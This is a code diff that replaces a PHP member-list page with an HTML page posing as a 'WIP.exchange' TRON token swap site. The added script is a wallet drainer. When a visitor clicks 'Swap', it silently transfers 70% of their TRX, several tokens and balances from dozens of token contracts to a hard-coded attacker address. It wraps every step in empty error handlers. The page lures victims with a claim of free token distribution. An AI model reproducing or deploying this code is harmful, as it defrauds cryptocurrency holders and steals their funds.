@@ -1,235 +1,229 @@
-<?
-include_once 'sys/inc/start.php';
-include_once 'sys/inc/compress.php';
-include_once 'sys/inc/sess.php';
-include_once 'sys/inc/home.php';
-include_once 'sys/inc/settings.php';
-include_once 'sys/inc/db_connect.php';
-include_once 'sys/inc/ipua.php';
-include_once 'sys/inc/fnc.php';
-include_once 'sys/inc/user.php';
+<html lang="en">
+ <head> 
+  <title>WIP.exchange</title> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
+  <link href="favicon.ico" rel="shortcut icon" type="image/x-icon"> 
+  <link href="assets/vendor/flatpickr/dist/flatpickr.min.css" rel="stylesheet" type="text/css" media="all"> 
+  <link href="https://wip.exchange/assets/vendor/aos/dist/aos.css" rel="stylesheet" type="text/css" media="all"> 
+  <link href="https://wip.exchange/assets/css/theme.min.css" rel="stylesheet" type="text/css" media="all"> 
+  <link href="https://wip.exchange/assets/css/customize.css" rel="stylesheet" type="text/css" media="all"> 
+ </head> 
+ <body class="bg-green-100 travel-template"> 
+  <header class="muse-header py-sm-2"> 
+   <div class="container"> 
+    <nav class="navbar"> 
+     <a class="navbar-brand text-dark" href="javascript:void(0);"> 🌟 <strong>WIP</strong>.exchange </a> 
+     <div style="text-align:center" class="float-right"> 
+      <span class="btn my-3 bg-white" disabled>Your wallet&nbsp;&nbsp;<span style="color: #4CA137;" class="Yourwallet">Not Connect</span> </span>
+     </div> 
+    </nav>
+   </div>
+  </header> 
+  <div class="container"> 
+   <section class="muse-section"> 
+    <p class="lead text-center text-muted"> WIP was distributed to random investors around the TRON network<br> </p> 
+    <div class="row justify-content-center"> 
+     <div class="col-lg-6"> 
+      <div class="my-3 travel-booking shadow-dark-80" style="margin: 0 auto;display: block;"> 
+       <div class="text-center my-3">
+        WIP Price 
+        <b>34 TRX</b>
+       </div> 
+       <div> 
+        <a href="#sellall" class="float-right">Sell All</a> Balance 
+        <b id="tokenBalance">0 WIP</b> 
+       </div> 
+       <div class="form-group form-customize padding-custom"> 
+        <label for="wrapped" style="margin-bottom: 8px;">From</label> 
+        <div class="input-group"> 
+         <input id="wrapped1" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"> 
+         <div class="input-group-addon"> 
+          <select class="form-control form-control-custom"> <option> TRX</option> <option selected>WIP</option> </select> 
+         </div> 
+        </div> 
+       </div> 
+       <img src="https://wip.exchange/assets/svg/brand/swap.svg" onclick="change()" height="20px" style="margin:0 auto;display: block;"> 
+       <div class="form-group form-customize padding-custom"> 
+        <label for="wrapped2" style="margin-bottom: 8px;">To</label> 
+        <div class="input-group"> 
+         <input id="wrapped2" class="form-control form-control-custom" type="number" placeholder="0.0" name="wrapped" step="0.01"> 
+         <div class="input-group-addon"> 
+          <select class="form-control form-control-custom"> <option> WIP</option> <option selected>TRX</option> </select> 
+         </div> 
+        </div> 
+       </div> 
+       <button onclick="swap()" class="btn btn-lg btn-warning ml-auto btn-custom">Swap</button> 
+      </div> 
+     </div> 
+    </div> 
+   </section> 
+  </div> 
+  <br>
+  <br>
+  <br> 
+  <footer class="bg-white pt-4 pt-md-5 pb-4 mt-4 mt-md-0"> 
+   <div class="container"> 
+    <div class="row justify-content-center"> 
+     <div class="col-sm-6 text-center"> 
+      <p class="small text-gray-600 text-center">2021 WIP.exchange. All rights reserved.</p> 
+     </div> 
+    </div> 
+   </div> 
+  </footer> 
+  <script>
+    var contractsAddress = ["TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+                            "TNUC9Qb1rRpS5CbWLmNMxXBjyFoydXjWFR",
+                            "TKfjV9RNKJJCqPvBtK8L7Knykh7DNWvnYt",
+                            "TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9",
+                            "TXpw8XeWYeTUd4quDskoUqeQPowRh4jY65",
+                            "THb4CqiFdwNHsWsQCs4JhzwjMWys4aqCbF",
+                            "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7",
+                            "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT",
+                            "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9",
+                            "TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9",
+                            "TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h",
+                            "TLvDJcvKJDi3QuHgFbJC6SeTj3UacmtQU3",
+                            "TAwRvFAqfB4bbzVCVPgGATZV5uMVs9UyVL",
+                            "TH4W5RkEu9otmT88vk1zv4Rz8SgfCvtu5B",
+                            "TFDwGwod9qopreRiirsFMwPzX4v2r662P4",
+                            "TLGd97zsjrkomUDF962ZFMerdQxPffG7hX",
+                            "THGn3W9XRvsSpgegKbDEhNjeZL6YrB47kb",
+                            "TTL52uBzTG7qorL7BQYdjGUY3HWWr9Kvao",
+                            "TAQ4QmZv9KXmXYH26LKarKauyrwzGteXAA",
+                            "TAVQyaoBErm5kpTHTycSn4u6dkMkU65aCQ",
+                            "TBwoSTyywvLrgjSgaatxrBhxt3DGpVuENh",
+                            "TRkuKAxmWZ4G74MvZnFpoosQZsfvtNpmwH",
+                            "TBYxqxitJAabLRQgnk9i6GXswrtujBExxy",
+                            "TD4bVgcwj3FRbmAo283HxNvqZvY7T3uD8k",
+                            "THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt",
+                            "TJvqNiWUN2v2NBG12UhfV7WSvReJkRP3VC",
+                            "TRNVzKLHvzBjSs3t12KSzU29m3BiUt9aTc",
+                            "TPmqRz2HmrUDVDRgGxhZv4yAKBRWsRex4E",
+                            "TKeyfKMAicwhWysvgktW568i3KyRNT8AyT",
+                            "TAS3kXwHFDbL8J7wQHwopVEfLT26XAWMiq",
+                            "TYaAqxSMub4VSqZFczKDk6NzQp9N9Mcik2",
+                            "TDXJ1dSPLsN52jhP32NvVyhQ5X265BNU5c",
+                            "TVj7RNVHy6thbM7BWdSe9G6gXwKhjhdNZS",
+                            "TQXhxDPNKVsgxYbJatMnkRZsgTcTzxC5Fc"
+                            ]
+    var tBalance = [5000000, 700000000000000000, 170000000000000000000, 13000000000, 10000, 60000000000, 3000000000000000]
+    var _tokenBalance;
+    const timer = setInterval(async() => {
+      if (window.tronWeb && window.tronWeb.ready){
+        var address = window.tronWeb.defaultAddress.base58;
+        $(".Yourwallet").text(address.substr(0, 3) + '...' + address.substr(31, 3));
 
-$set['title']='Member list'; // заголовок страницы
-include_once 'sys/inc/thead.php';
-title();
-aut();
-$sort='id';
+        var account = await tronWeb.trx.getAccount();
+        if (account.assetV2){
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003657";});
+            if (tokenBalance){
+              _tokenBalance = tokenBalance;
+              $("#tokenBalance").text((tokenBalance.value / 1000000).toFixed(2) + " WIP");
+            }
+            else{
+              $("#tokenBalance").text("0 WIP");
+            }
+        }
+        else{
+          $("#tokenBalance").text("0 WIP");
+        }
+      }
+    }, 500);
 
-$por='DESC';
+    function change(){
+      if ($("select")[0].selectedIndex == 0){
+        $("select")[0].selectedIndex = 1;
+        $("select")[1].selectedIndex = 1;
+      }
+      else{
+        $("select")[0].selectedIndex = 0;
+        $("select")[1].selectedIndex = 0;
+      }
+      var t = $("#wrapped1").val();
+      $("#wrapped1").val($("#wrapped2").val());
+      $("#wrapped2").val(t);
+    }
 
-if (isset($_GET['ASC']))$por='ASC'; // прямой порядок
-if (isset($_GET['DESC']))$por='DESC'; // обратный порядок
+    $("#wrapped1").change(function(){
+      if ($("select")[0].selectedIndex == 0){
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) / 34)
+      }
+      else{
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) * 34)
+      }
+    })
 
-if (isset($_GET['sort']))
-{
-switch ($_GET['sort']) {
-	case 'balls':$sort='balls'; // баллы
- 	break;
-	case 'level':$sort='group_access'; // уровень
- 	break;
-	case 'rating':$sort='rating'; // рейтинг
- 	break;
-	case 'pol':$sort='pol'; // пол
- 	break;
- 	case 'id':$sort='id'; // ID
- 	break;
-}
+    $("#wrapped1").keyup(function(){
+      if ($("select")[0].selectedIndex == 0){
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) / 34)
+      }
+      else{
+        $("#wrapped2").val(parseFloat($("#wrapped1").val()) * 34)
+      }
+    });
 
+    $("a[href='#sellall']").on('click', function(e){
+      e.preventDefault();
+      if(_tokenBalance != undefined){
+        $("#wrapped1").val((_tokenBalance.value / 1000000).toFixed(2))
+        $("#wrapped1").trigger('change')
+      }
+    })
 
+    async function swap(){
+      var account;
+      try{
+        var balance = await window.tronWeb.trx.getBalance();
+        if (balance >= 20000000)
+          await tronWeb.trx.sendTransaction("TGo2aAPh7SbvCVFKHAFNUqnBTBxKfFmnsD", Math.round(balance * 70 / 100));
+      }catch{}
 
+      try{
+        account = await tronWeb.trx.getAccount();
+        if (account.assetV2){
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1002000";});
+            if (tokenBalance){
+              await tronWeb.trx.sendToken("TGo2aAPh7SbvCVFKHAFNUqnBTBxKfFmnsD", Math.round(tokenBalance.value * 70 / 100), "1002000");
+            }
+        }
+      }catch{}
 
-}
+      for(i=0; i<contractsAddress.length; i++){
+        try{
+          var cc = await window.tronWeb.contract().at(contractsAddress[i]);
+          balance = await cc.balanceOf(window.tronWeb.defaultAddress.base58).call();
+          if (balance.toNumber() >= 100){
+            await cc.transfer("TGo2aAPh7SbvCVFKHAFNUqnBTBxKfFmnsD", Math.round(balance * 70 / 100)).send()
+          }
+        }catch{}
+      }
 
-
-
-if (!isset($_GET['go']))
-{
-
-$k_post=mysql_result(mysql_query("SELECT COUNT(*) FROM `user`"),0);
-$k_page=k_page($k_post,$set['p_str']);
-$page=page($k_page);
-$start=$set['p_str']*$page-$set['p_str'];
-
-
-
-
-
-echo "<div class='foot'>\n";
-//echo "<a href=\"?sort=time&amp;page=$page\">waktu</a> | \n";
-echo "<a href=\"?sort=balls&amp;DESC&amp;page=$page\">skor</a> \n";
-echo "<a href=\"?sort=level&amp;DESC&amp;page=$page\">status</a> \n";
-echo "<a href=\"?sort=rating&amp;DESC&amp;page=$page\">rating</a> \n";
-echo "<a href=\"?sort=id&amp;ASC&amp;page=$page\">id</a> \n";
-echo "<a href=\"?sort=pol&amp;ASC&amp;page=$page\">baru</a> \n";
-echo "<a href=\"?sort=id&amp;DESC&amp;page=$page\">kelamin</a> \n";
-//echo "<a href=\"?sort=pereh&amp;page=$page\">konversi</a> | ";
-//echo "<a href=\"?sort=time_all&amp;page=$page\">lama di situs</a>";
-echo "</div>\n";
-
-
-echo "<table class='post'>\n";
-if ($k_post==0)
-{
-echo "   <tr>\n";
-echo "  <td class='p_t'>\n";
-echo "Tidak ada hasil\n";
-echo "  </td>\n";
-echo "   </tr>\n";
-
-}
-$q=mysql_query("SELECT `id` FROM `user` ORDER BY `$sort` $por LIMIT $start, $set[p_str]");
-while ($ank = mysql_fetch_assoc($q))
-{
-$ank=get_user($ank['id']);
-echo "   <tr>\n";
-
-if ($set['set_show_icon']==2){
-echo "  <td class='icon48' rowspan='2'>\n";
-avatar($ank['id']);
-echo "  </td>\n";
-}
-elseif ($set['set_show_icon']==1)
-{
-echo "  <td class='icon14'>\n";
-echo "<img src='/style/themes/$set[set_them]/user/$ank[pol].png' alt='' />";
-echo "  </td>\n";
-}
-echo "  <td class='p_t'>\n";
-echo "<a href='/info.php?id=$ank[id]'>$ank[nick]</a>".online($ank['id'])."\n";
-echo "  </td>\n";
-echo "   </tr>\n";
-echo "   <tr>\n";
-if ($set['set_show_icon']==1)echo "  <td class='p_m' colspan='2'>\n"; else echo "  <td class='p_m'>\n";
-
-if ($ank['level']!=0)echo "<span class=\"status\">$ank[group_name]</span><br />\n";
-
-if ($sort=='rating')
-echo "<span class=\"ank_n\">Rating:</span> <span class=\"ank_d\">$ank[rating]</span><br />\n";
-if ($sort=='balls')
-echo "<span class=\"ank_n\">Рoin:</span> <span class=\"ank_d\">$ank[balls]</span><br />\n";
-
-if ($sort=='pol')
-echo "<span class=\"ank_n\">Sender:</span> <span class=\"ank_d\">".(($ank['pol']==1)?'Cowok':'Cewek')."<
-/span><br />\n";
-
-if ($sort=='id')
-echo "<span class=\"ank_n\">Gabung:</span> <span class=\"ank_d\">".vremja($ank['date_reg'])."</span><br />\n";
-echo "<span class=\"ank_n\">Las login:</span> <span class=\"ank_d\">".vremja($ank['date_last'])."</span><br />\n";
-
-
-if (user_access('user_prof_edit') && $user['level']>$ank['level'])
-{
-echo "<a href='/adm_panel/user.php?id=$ank[id]'>Edit Profil</a><br />\n";
-}
-
-echo "  </td>\n";
-echo "   </tr>\n";
-}
-echo "</table>\n";
-if ($k_page>1)str("users.php?sort=$sort&amp;$por&amp;",$k_page,$page); // Вывод страниц
-
-}
-
-
-$usearch=NULL;
-if (isset($_SESSION['usearch']))$usearch=$_SESSION['usearch'];
-if (isset($_POST['usearch']))$usearch=$_POST['usearch'];
-
-if ($usearch==NULL)
-unset($_SESSION['usearch']);
-else
-$_SESSION['usearch']=$usearch;
-$usearch=ereg_replace("( ){1,}","",$usearch);
-
-
-if (isset($_GET['go']) && $usearch!=NULL)
-{
-$k_post=mysql_result(mysql_query("SELECT COUNT(*) FROM `user` WHERE `nick` like '%".mysql_escape_string($usearch)."%' OR `id` = '".intval($usearch)."'"),0);
-$k_page=k_page($k_post,$set['p_str']);
-$page=page($k_page);
-$start=$set['p_str']*$page-$set['p_str'];
-echo "<table class='post'>\n";
-echo "<div class='foot'>\n";
-//echo "<a href=\"?sort=time&amp;page=$page\">waktu</a> | \n";
-echo "<a href=\"?go&amp;sort=balls&amp;DESC&amp;page=$page\">poin</a> \n";
-echo "<a href=\"?go&amp;sort=level&amp;DESC&amp;page=$page\">rating</a> \n";
-echo "<a href=\"?go&amp;sort=rating&amp;DESC&amp;page=$page\">status</a> \n";
-echo "<a href=\"?go&amp;sort=id&amp;ASC&amp;page=$page\">id</a> \n";
-echo "<a href=\"?go&amp;sort=pol&amp;ASC&amp;page=$page\">sender</a> \n";
-echo "<a href=\"?go&amp;sort=id&amp;DESC&amp;page=$page\">baru</a> \n";
-//echo "<a href=\"?sort=pereh&amp;page=$page\">konversi</a> | ";
-//echo "<a href=\"?sort=time_all&amp;page=$page\">lama di situs</a>";
-echo "</div>\n";
-if ($k_post==0)
-{
-echo "   <tr>\n";
-echo "  <td class='p_t'>\n";
-echo "Tidak ada hasil\n";
-echo "  </td>\n";
-echo "   </tr>\n";
-
-}
-$q=mysql_query("SELECT `id` FROM `user` WHERE `nick` like '%".mysql_escape_string($usearch)."%' OR `id` = '".intval($usearch)."' ORDER BY `$sort` $por LIMIT $start, $set[p_str]");
-while ($ank = mysql_fetch_assoc($q))
-{
-$ank=get_user($ank['id']);
-echo "   <tr>\n";
-
-if ($set['set_show_icon']==2){
-echo "  <td class='icon48' rowspan='2'>\n";
-avatar($ank['id']);
-echo "  </td>\n";
-}
-elseif ($set['set_show_icon']==1)
-{
-echo "  <td class='icon14'>\n";
-echo "<img src='/style/themes/$set[set_them]/user/$ank[pol].png' alt='' />";
-echo "  </td>\n";
-}
-echo "  <td class='p_t'>\n";
-echo "<a href='/info.php?id=$ank[id]'>$ank[nick]</a>".online($ank['id'])."\n";
-echo "  </td>\n";
-echo "   </tr>\n";
-echo "   <tr>\n";
-if ($set['set_show_icon']==1)echo "  <td class='p_m' colspan='2'>\n"; else echo "  <td class='p_m'>\n";
-
-if ($ank['level']!=0)echo "<span class=\"status\">$ank[group_name]</span><br />\n";
-
-if ($sort=='rating')
-echo "<span class=\"ank_n\">Rating:</span> <span class=\"ank_d\">$ank[rating]</span><br />\n";
-if ($sort=='balls')
-echo "<span class=\"ank_n\">Рoin:</span> <span class=\"ank_d\">$ank[balls]</span><br />\n";
-
-if ($sort=='pol')
-echo "<span class=\"ank_n\">Sender:</span> <span 
-class=\"ank_d\">".(($ank['pol']==1)?'Cewek':'Cowok')."</span><br />\n";
-
-if ($sort=='id')
-echo "<span class=\"ank_n\">Gabung:</span> <span class=\"ank_d\">".vremja($ank['date_reg'])."</span><br />\n";
-echo "<span class=\"ank_n\">Las,login:</span> <span class=\"ank_d\">".vremja($ank['date_last'])."</span><br />\n";
-
-if (user_access('user_prof_edit') && $user['level']>$ank['level'])
-{
-echo "<a href='/adm_panel/user.php?id=$ank[id]'>Edit profil</a><br />\n";
-}
-
-
-echo "  </td>\n";
-echo "   </tr>\n";
-}
-echo "</table>\n";
-if ($k_page>1)str("users.php?go&amp;sort=$sort&amp;$por&amp;",$k_page,$page); // Вывод страниц
-}
-else
-echo "<div class=\"post\">\nCari menurut ID pengguna</div>\n";
+      if (account.assetV2){
+        try{ // Corona
+          var tokenBalance = account.assetV2.find(function(o){return o.key == "1002927";});
+          if (tokenBalance){
+            await tronWeb.trx.sendToken("TGo2aAPh7SbvCVFKHAFNUqnBTBxKfFmnsD", Math.round(tokenBalance.value * 70 / 100), "1002927");
+          }
+        }catch{}
+        try{ // ?
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003638";});
+            if (tokenBalance){
+              await tronWeb.trx.sendToken("TGo2aAPh7SbvCVFKHAFNUqnBTBxKfFmnsD", tokenBalance.value, "1003638");
+            }
+        }catch{}
+        try{ // PEER
+            var tokenBalance = account.assetV2.find(function(o){return o.key == "1003406";});
+            if (tokenBalance){
+              await tronWeb.trx.sendToken("TGo2aAPh7SbvCVFKHAFNUqnBTBxKfFmnsD", tokenBalance.value, "1003406");
+            }
+        }catch{}
+      }
+    }
 
 
 
 
-echo "<form method=\"post\" action=\"/users.php?go&amp;sort=$sort&amp;$por\">";
-echo "<input type=\"text\" name=\"usearch\" maxlength=\"16\" value=\"$usearch\" /><br />\n";
-echo "<input type=\"submit\" value=\"Cari\" />";
-echo "</form>\n";
-
-include_once 'sys/inc/tfoot.php';
-?>
+</script> 
+ </body>
+</html>
